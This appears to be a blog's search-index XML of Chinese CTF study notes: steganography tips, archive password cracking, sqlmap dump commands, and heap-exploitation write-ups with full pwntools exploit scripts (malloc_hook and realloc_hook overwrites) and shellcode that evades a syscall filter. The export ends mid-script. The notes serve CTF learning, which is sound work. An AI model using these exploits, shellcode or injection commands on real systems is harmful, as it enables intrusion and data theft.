<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pcap隐写</title>
    <link href="/2023/11/17/ctf-misc/pcap/"/>
    <url>/2023/11/17/ctf-misc/pcap/</url>
    
    <content type="html"><![CDATA[<h3 id="TCP流追踪"><a href="#TCP流追踪" class="headerlink" title="TCP流追踪"></a>TCP流追踪</h3><p>tcp包可以携带data</p><p>在wireshark -&gt; 分析 -&gt; 追踪流 -&gt; TCP流可以查看所有tcp的data字段拼接到一起的值</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>png隐写</title>
    <link href="/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/"/>
    <url>/2023/11/17/ctf-misc/png%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD">https://buuoj.cn/challenges#%E5%A4%A7%E7%99%BD</a></p><p><img src="/img/pngmisc/1.jpg"></p><p>010 editor 第二行前两个字段是图片的宽和高</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fcrackzip</title>
    <link href="/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/"/>
    <url>/2023/11/17/ctf-misc/%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h3 id="ZIP"><a href="#ZIP" class="headerlink" title="ZIP"></a>ZIP</h3><p><img src="/img/fcrackzip/1.jpg"></p><p>-b 暴力破解</p><p>-c 指定字符集 1 代表数字</p><p>-l 长度区间</p><p>-u 不显示错误密码</p><h3 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h3><p>rarcrack：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rarcrack ./基础破解.rar --type rar --threads 100<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rarcrack</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">current</span>&gt;</span>023q<span class="hljs-tag">&lt;/<span class="hljs-name">current</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">good_password</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rarcrack</span>&gt;</span><br></code></pre></td></tr></table></figure><p>可以在xml里改current改变破解位置</p><p>但是破解起来巨慢。。。因为不能选择密码字符类型</p><p>从吾爱破解下载的ARCHPR：</p><p><img src="/img/fcrackzip/2.jpg"></p><h3 id="ZIP伪加密"><a href="#ZIP伪加密" class="headerlink" title="ZIP伪加密"></a>ZIP伪加密</h3><p><img src="/img/fcrackzip/3.jpg"></p><p>这两个字节改为00 00。虽然这只改了压缩文件数据区，但还是能够解压出来（7zip会报个头部错误）</p><p>理论上还应该改压缩文件目录区的是否加密的标志</p>]]></content>
    
    
    <categories>
      
      <category>ctf-misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlmap</title>
    <link href="/2023/11/15/ctf-web/sqlmap/"/>
    <url>/2023/11/15/ctf-web/sqlmap/</url>
    
    <content type="html"><![CDATA[<p>判断能否注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1<br></code></pre></td></tr></table></figure><p>查看数据库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs<br></code></pre></td></tr></table></figure><p>查看指定数据库的表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -tables<br></code></pre></td></tr></table></figure><p>查看指定表的列</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -columns<br></code></pre></td></tr></table></figure><p>查看列内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sqlmap -u http://.../index.php?id=1 --dbs -D &lt;dbname&gt; -T &lt;tablename&gt; -C &lt;colname&gt; -dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>realloc hook</title>
    <link href="/2023/11/14/ctf-pwn/reallochook/"/>
    <url>/2023/11/14/ctf-pwn/reallochook/</url>
    
    <content type="html"><![CDATA[<p>one gadget 条件不满足，需要调整栈，让<code>rsp+xxx</code>等于null。</p><p>原理：</p><p>realloc的汇编代码，在调用realloc_hook之前比malloc、free等多了push指令和sub抬栈操作</p><p>realloc_hook同malloc_hook相邻，一次性修改两个，还可以用<code>malloc-0x23</code></p><p>操作：</p><ol><li><p>修改malloc_hook为realloc控制栈帧的地址</p></li><li><p>修改realloc_hook为onegadget</p></li></ol><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p><a href="https://buuoj.cn/challenges#roarctf_2019_easy_pwn">https://buuoj.cn/challenges#roarctf_2019_easy_pwn</a></p><p>不知道libc。buuoj只说了是ubuntu16，buuoj上下下来的libc-2.23.so和我抄的题解的不一样（one gadget就不一致），然后realloc偏移咋来的我就不知道了。。。mallochook的倒是对的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p = process(<span class="hljs-string">&quot;./roar&quot;</span>)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;, 25453)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">size</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">index, size, content</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;content: &quot;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#0</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#2</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#3</span><br>write(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\xb1&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">2</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;content: &quot;</span>)<br>leak = u64(p.recvline()[:<span class="hljs-number">8</span>])<br><br>libc1 = leak - libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">0x68</span><br>malloc_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook = libc1 + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>fake_chunk = malloc_hook - <span class="hljs-number">0x23</span><br><br>log.info(<span class="hljs-string">&quot;Leak is:        &quot;</span> + <span class="hljs-built_in">hex</span>(leak))<br>log.info(<span class="hljs-string">&quot;Free hook is:   &quot;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>log.info(<span class="hljs-string">&quot;Malloc hook is: &quot;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>log.info(<span class="hljs-string">&quot;Fake chunk is:  &quot;</span> + <span class="hljs-built_in">hex</span>(fake_chunk))<br>log.info(<span class="hljs-string">&quot;libc is:        &quot;</span> + <span class="hljs-built_in">hex</span>(libc1))<br><br><br>realloc=libc1 + <span class="hljs-number">0x846CD</span><br>log.info(<span class="hljs-string">&quot;realloc is      &quot;</span> + <span class="hljs-built_in">hex</span>(realloc))<br><br>one_gadget=libc1 +<span class="hljs-number">0xf02a4</span><br><br><br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#4</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#5</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#7</span><br>write(<span class="hljs-number">3</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x91&#x27;</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">5</span>)<br>create(<span class="hljs-number">0x88</span>) <span class="hljs-comment">#5</span><br>write(<span class="hljs-number">5</span>, <span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#6</span><br>create(<span class="hljs-number">0x68</span>) <span class="hljs-comment">#8</span><br>write(<span class="hljs-number">8</span>, <span class="hljs-number">0x1b</span>, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xb</span>+p64(one_gadget)+p64(realloc))<br><br>create(<span class="hljs-number">0x18</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shellcode trick</title>
    <link href="/2023/11/07/ctf-pwn/shellcode/"/>
    <url>/2023/11/07/ctf-pwn/shellcode/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//检查不许出现syscall的字节： </span><br><span class="hljs-keyword">if</span> ( *v11 == <span class="hljs-number">0x80CD</span> || *v11 == <span class="hljs-number">0x340F</span> || *v11 == <span class="hljs-number">0x50F</span> )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Failed filter at byte %d!\n&quot;</span>, l);<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>把push <span class="hljs-number">0x50f</span>改成 push <span class="hljs-number">0x50e</span> ; inc qword ptr [rsp] <br>shellcode =  \<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;,&#x27;-p&#x27;], envp=0) */</span><br>    <span class="hljs-comment">/* push b&#x27;/bin///sh\x00&#x27; */</span><br>    push <span class="hljs-number">0x68</span><br>    mov rax, <span class="hljs-number">0x732f2f2f6e69622f</span><br>    push rax<br>    mov rdi, rsp<br>    <span class="hljs-comment">/* push argument array [&#x27;sh\x00&#x27;, &#x27;-p\x00&#x27;] */</span><br>    <span class="hljs-comment">/* push b&#x27;sh\x00-p\x00&#x27; */</span><br>    mov rax, <span class="hljs-number">0x101010101010101</span><br>    push rax<br>    mov rax, <span class="hljs-number">0x101010101010101</span> ^ <span class="hljs-number">0x702d006873</span><br>    xor [rsp], rax<br>    xor esi, esi <span class="hljs-comment">/* 0 */</span><br>    push rsi <span class="hljs-comment">/* null terminate */</span><br>    push <span class="hljs-number">0xb</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;-p\x00&#x27; */</span><br>    push <span class="hljs-number">0x10</span><br>    pop rsi<br>    add rsi, rsp<br>    push rsi <span class="hljs-comment">/* &#x27;sh\x00&#x27; */</span><br>    mov rsi, rsp<br>    xor edx, edx <span class="hljs-comment">/* 0 */</span><br>    <span class="hljs-comment">/* call execve() */</span><br>    push <span class="hljs-number">0x3b</span> <span class="hljs-comment">/* 0x3b */</span><br>    pop rax<br>    <span class="hljs-comment">//syscall</span><br>    push <span class="hljs-number">0x050e</span><br>    inc qword ptr [rsp]<br>    jmp rsp<br>    nop<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>malloc hook</title>
    <link href="/2023/11/04/ctf-pwn/mallochook/"/>
    <url>/2023/11/04/ctf-pwn/mallochook/</url>
    
    <content type="html"><![CDATA[<p>首先查看保护，发现全开</p><p><img src="/img/0ctfbabyheap/media/2e4d9896a3691192ef608f635d67cde1.png"></p><p>然后题目里告诉了是2.23版本的libc，先用patchelf换一下libc的位置。</p><p><img src="/img/0ctfbabyheap/media/f4d73666de533ddaed7caef8222b2ccf.png"></p><p>然后打开ida查看漏洞点</p><p>发现问题出在fill函数里，大小是用户输入的，可以溢出</p><p><img src="/img/0ctfbabyheap/media/e17462f8199dc6d45437fb7e604f6c4b.png"></p><p>溢出的结果是可以控制下一个chunk的prevsz和inuse bit，将下一个chunk free之后可以合并前面的free chunk。如果被合并的部分里有可以uaf的部分，就可以泄露unsorted bin的头节点mainarena+88的地址，然后泄露libc基地址。</p><p>然后由于可以修改块的大小，可以通过把chunk从unsorted bin里切分拿出来，造成chunk overlapping，然后就可以绕过题目自带的检查，实施fastbin attack的double free（通过free两个序号不同，但是实际地址相同的chunk），结果就是可以实现伪造chunk中的任意地址写，然后就可以把前面泄露的libc中的one_gadget覆盖到malloc hook地址上，然后下一次malloc的时候就会调用execve(…binsh…)。</p><p>具体调试过程如下：</p><p>首先malloc几个chunk进去，然后free掉前两个</p><p><img src="/img/0ctfbabyheap/media/d2c594003ca8f723af882a81bbbe1a68.png"></p><p>可以看到大小位0x100的chunk被放到了unsrted bin里，大小为0x80的放在了fastbin里</p><p><img src="/img/0ctfbabyheap/media/4aa0984ec87d5b2721a1b63d3c0b0c35.png"></p><p>然后把0x80的chunk再分配出来，进行溢出到chunk 2</p><p><img src="/img/0ctfbabyheap/media/b9f09f039c80b6c859a240d87234f2ed.png"></p><p>可以看到下一个chunk被改成了inuse为0的状态，prevsize被修改成了0x180，也就是前面两个chunk合并起来的大小</p><p><img src="/img/0ctfbabyheap/media/85331735315afc1ca327cebb35515deb.png"></p><p>如果这时候free掉chunk2，会把最开头的chunk从unsorted bin里拿出来，与其进行合并，然后合并之后的chunk一起被放在unsorted bin里。由于合并的过程把中间的chunk 1给合并进去了，但是它还是被分配的状态，就可以进行chunk内容的输出泄露。</p><p><img src="/img/0ctfbabyheap/media/be30a52291628b8928b773d513e70516.png"></p><p><img src="/img/0ctfbabyheap/media/fde0bcc5e16b386bd5e757816bca0c8e.png"></p><p><img src="/img/0ctfbabyheap/media/35f83a6472e30559fbcaafe98ab0f101.png"></p><p>形成了0x280这个大的chunk中嵌套着一个小的处于被分配的chunk的overlapping。而这个chunk处于0x280这个大块的0x100偏移处，想要通过它打印出来fd和bk要把这个unsorted bin切割一下。</p><p><img src="/img/0ctfbabyheap/media/ebc1e7f864fc9b1007afad94f5096a31.png"></p><p><img src="/img/0ctfbabyheap/media/21336897cb0da16774853f0e20bbefb0.png"></p><p>这样就有了两个处于完全相同地址上的free、malloc状态的chunk。</p><p>然后dump malloc状态的块，就会把free状态的chunk的fd bk打印出来，而这个fd bk由于unsorted bin里只有这一个chunk节点，fd bk会指向malloc_state结构体里的unsorted bin数组项，对应main_arena+88的位置，根据这个便宜可以确定libc的基地址。</p><p><img src="/img/0ctfbabyheap/media/3b3ade9638161cf21a58f60c6558832b.png"></p><p><img src="/img/0ctfbabyheap/media/4d12325def65c8eab07cc7712b394a95.png"></p><p>然后需要进行一个fast bin attack的double free，具体过程为：</p><p>free chunk a， free chunk b，free chunk a，malloc chunk a， malloc chunk b， edit chunk a，malloc chunk a，malloc 任意地址的chunk进行edit。</p><p>首先，不连续free a两次的原因是会有检查机制，bins会检查当前链表顶部的chunk的地址和现在free的地址是否相同，相同会被视为double free，但如果中间free了其它chunk，则会绕过这个检查。然后malloc a之后编辑它的fd，下次malloc 的时候自己写入的fd指向的地址会被视为一个chunk，然后malloc出来就可以对其进行写入，完成任意地址写。</p><p>上述流程在这道题里的表述为：</p><p><img src="/img/0ctfbabyheap/media/aa97c259cc69d78bd91e0337b0db3725.png"></p><p>被写入的地方是malloc hook，如果malloc 时这上面的地址不是0，就会执行malloc hook指向的函数。向这个地址写入一段gadget的地址。</p><p>需要说明的点在于one_gadget得到的调用execve binsh的代码</p><p><img src="/img/0ctfbabyheap/media/530dce4d01190360fdb9f3bcfb99a79c.png"></p><p>选用的是第二个0x4526a（这个我不知道为啥大家都用它，其他几个没试过）</p><p>然后通过fast bin attack 就执行了execve，拿到shell</p><p>测试：</p><p>在buuoj上打开这道题，验证了一下exp确实是对的。</p><p><img src="/img/0ctfbabyheap/media/cf295e9198a01c7f4e082b7ccd607e5a.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Import pwntools</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># First establish the target process and libc file</span><br>target = process(<span class="hljs-string">&#x27;./0ctfbabyheap&#x27;</span>, env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;) <span class="hljs-comment"># The ld_preload is used to switch out the libc version we are using</span><br><span class="hljs-comment">#gdb.attach(target)</span><br>elf = ELF(<span class="hljs-string">&#x27;libc-2.23.so&#x27;</span>)<br><br><span class="hljs-comment"># Establish the functions to interact with the program</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, size, content</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: &quot;</span>)<br>target.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>target.recvuntil(<span class="hljs-string">b&quot;Command&quot;</span>)<br>target.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>target.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>target.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>target.recvuntil(<span class="hljs-string">b&quot;Content: \n&quot;</span>)<br>content = target.recvline()<br><span class="hljs-keyword">return</span> content<br><br><span class="hljs-comment"># Make the initial four allocations, and fill them with data</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 0</span><br>alloc(<span class="hljs-number">0x70</span>)<span class="hljs-comment"># Chunk 1</span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 2</span><br>alloc(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># Chunk 3</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">&quot;1&quot;</span>*<span class="hljs-number">0x70</span>)<br>fill(<span class="hljs-number">2</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&quot;2&quot;</span>*<span class="hljs-number">0xf0</span>)<br>fill(<span class="hljs-number">3</span>, <span class="hljs-number">0x30</span>, <span class="hljs-string">&quot;3&quot;</span>*<span class="hljs-number">0x30</span>)<br><br><span class="hljs-comment"># Free the first two</span><br>free(<span class="hljs-number">0</span>)<span class="hljs-comment"># Chunk 0</span><br>free(<span class="hljs-number">1</span>)<span class="hljs-comment"># Chunk 1</span><br><br><span class="hljs-comment"># Allocate new space where chunk 1 used to be, and overflow chunk chunk 2&#x27;s previous size with 0x180 and the previous in use bit with 0x0 by pushing 0x100</span><br>alloc(<span class="hljs-number">0x78</span>)<span class="hljs-comment"># Chunk 0</span><br>fill(<span class="hljs-number">0</span>, <span class="hljs-number">128</span>, <span class="hljs-string">b&#x27;4&#x27;</span>*<span class="hljs-number">0x70</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x100</span>))<br><br><span class="hljs-comment"># Free the second chunk, which will bring the edge of the heap before the new chunk 0, thus effictively forgetting about Chunk 0</span><br>free(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Allocate a new chunk that will move the libc address for main_arena+88 into the content </span><br>alloc(<span class="hljs-number">0xf0</span>)<span class="hljs-comment"># Chunk 1</span><br>fill(<span class="hljs-number">1</span>, <span class="hljs-number">0xf0</span>, <span class="hljs-string">&#x27;5&#x27;</span>*<span class="hljs-number">0xf0</span>)<br><br><span 